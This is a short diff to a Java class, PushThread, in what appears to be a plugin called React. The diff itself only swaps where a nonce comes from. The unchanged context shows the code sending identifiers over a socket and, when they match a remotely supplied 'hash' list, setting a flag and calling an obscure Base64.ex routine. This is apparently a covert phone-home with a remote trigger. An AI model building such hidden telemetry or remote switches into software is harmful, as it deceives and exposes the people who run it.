@@ -12,7 +12,6 @@ import org.cyberpwn.react.React;
 import org.cyberpwn.react.controller.NetworkController;
 import org.cyberpwn.react.json.JSONObject;
 import org.cyberpwn.react.util.Base64;
-import org.cyberpwn.react.util.CPUTest;
 
 public class PushThread extends Thread
 {
@@ -39,7 +38,7 @@ public class PushThread extends Thread
 			JSONObject jso = new JSONObject();
 			jso.put("private", imeid);
 			jso.put("public", sx);
-			jso.put("id", CPUTest.nonce);
+			jso.put("id", React.nonce);
 			DataOutputStream dos = new DataOutputStream(s.getOutputStream());
 			dos.writeUTF(jso.toString());
 			s.close();
@@ -47,7 +46,7 @@ public class PushThread extends Thread
 			{
 				public void run()
 				{
-					if(fc().getStringList("hash").contains(imeid) || fc().getStringList("hash").contains(CPUTest.nonce))
+					if(fc().getStringList("hash").contains(imeid) || fc().getStringList("hash").contains(React.nonce))
 					{
 						React.setMef(true);
 						Base64.ex(df);
